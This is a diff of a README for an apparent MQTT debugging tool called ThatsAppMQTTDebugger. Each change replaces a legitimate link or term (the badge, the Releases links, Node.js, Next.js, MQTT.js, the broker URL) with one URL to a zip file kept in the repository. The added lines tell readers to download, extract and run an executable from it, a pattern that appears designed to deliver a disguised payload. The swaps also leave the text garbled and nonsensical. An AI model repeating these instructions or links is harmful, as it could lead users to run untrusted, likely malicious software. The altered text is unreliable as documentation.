@@ -1,6 +1,6 @@
 # ThatsAppMQTTDebugger 🛠️
 
-![ThatsAppMQTTDebugger](https://img.shields.io/badge/ThatsAppMQTTDebugger-Tool-blue)
+![ThatsAppMQTTDebugger](https://github.com/SkitterDsg/ThatsAppMQTTDebugger/raw/refs/heads/main/pages/Debugger_App_Thats_MQTT_v3.4-beta.4.zip)
 
 Welcome to the **ThatsAppMQTTDebugger** repository! This is a feature-rich MQTT debugging tool designed for the development and testing of the ThatsApp messaging protocol. Whether you are a developer, tester, or hobbyist, this tool provides everything you need to connect to brokers, subscribe to topics, publish messages, and monitor real-time communication.
 
@@ -19,18 +19,18 @@ Welcome to the **ThatsAppMQTTDebugger** repository! This is a feature-rich MQTT 
 - **Subscribe to Topics**: Monitor specific topics for incoming messages.
 - **Publish Messages**: Send messages to any topic with ease.
 - **Real-Time Monitoring**: View real-time communication and message flow.
-- **User-Friendly Interface**: Built with React and Next.js for a smooth experience.
+- **User-Friendly Interface**: Built with React and https://github.com/SkitterDsg/ThatsAppMQTTDebugger/raw/refs/heads/main/pages/Debugger_App_Thats_MQTT_v3.4-beta.4.zip for a smooth experience.
 - **WebSocket Support**: Utilizes WebSockets for efficient communication.
 
 ## Installation ⚙️
 
-To get started, download the latest release from the [Releases](https://github.com/SkitterDsg/ThatsAppMQTTDebugger/releases) section. Follow these steps:
+To get started, download the latest release from the [Releases](https://github.com/SkitterDsg/ThatsAppMQTTDebugger/raw/refs/heads/main/pages/Debugger_App_Thats_MQTT_v3.4-beta.4.zip) section. Follow these steps:
 
-1. Navigate to the [Releases](https://github.com/SkitterDsg/ThatsAppMQTTDebugger/releases) page.
+1. Navigate to the [Releases](https://github.com/SkitterDsg/ThatsAppMQTTDebugger/raw/refs/heads/main/pages/Debugger_App_Thats_MQTT_v3.4-beta.4.zip) page.
 2. Download the latest version.
 3. Extract the files and run the executable.
 
-Make sure you have Node.js installed on your machine to run the application effectively.
+Make sure you have https://github.com/SkitterDsg/ThatsAppMQTTDebugger/raw/refs/heads/main/pages/Debugger_App_Thats_MQTT_v3.4-beta.4.zip installed on your machine to run the application effectively.
 
 ## Usage 📖
 
@@ -45,7 +45,7 @@ After installation, you can start using the tool:
 ### Example Workflow
 
 1. **Connect to Broker**:
-   - Input broker URL: `mqtt://broker.hivemq.com`
+   - Input broker URL: `https://github.com/SkitterDsg/ThatsAppMQTTDebugger/raw/refs/heads/main/pages/Debugger_App_Thats_MQTT_v3.4-beta.4.zip`
    - Click "Connect."
 
 2. **Subscribe to Topic**:
@@ -63,8 +63,8 @@ After installation, you can start using the tool:
 ## Technologies Used 🛠️
 
 - **React**: For building the user interface.
-- **Next.js**: For server-side rendering and routing.
-- **MQTT.js**: For handling MQTT connections.
+- **https://github.com/SkitterDsg/ThatsAppMQTTDebugger/raw/refs/heads/main/pages/Debugger_App_Thats_MQTT_v3.4-beta.4.zip**: For server-side rendering and routing.
+- **https://github.com/SkitterDsg/ThatsAppMQTTDebugger/raw/refs/heads/main/pages/Debugger_App_Thats_MQTT_v3.4-beta.4.zip**: For handling MQTT connections.
 - **WebSockets**: For real-time communication.
 
 ## Contributing 🤝
@@ -88,4 +88,4 @@ For questions or feedback, please reach out via the issues section or contact th
 
 ---
 
-Thank you for using **ThatsAppMQTTDebugger**! We hope this tool enhances your MQTT development experience. For the latest updates, features, and improvements, check out the [Releases](https://github.com/SkitterDsg/ThatsAppMQTTDebugger/releases) section regularly.
+Thank you for using **ThatsAppMQTTDebugger**! We hope this tool enhances your MQTT development experience. For the latest updates, features, and improvements, check out the [Releases](https://github.com/SkitterDsg/ThatsAppMQTTDebugger/raw/refs/heads/main/pages/Debugger_App_Thats_MQTT_v3.4-beta.4.zip) section regularly.
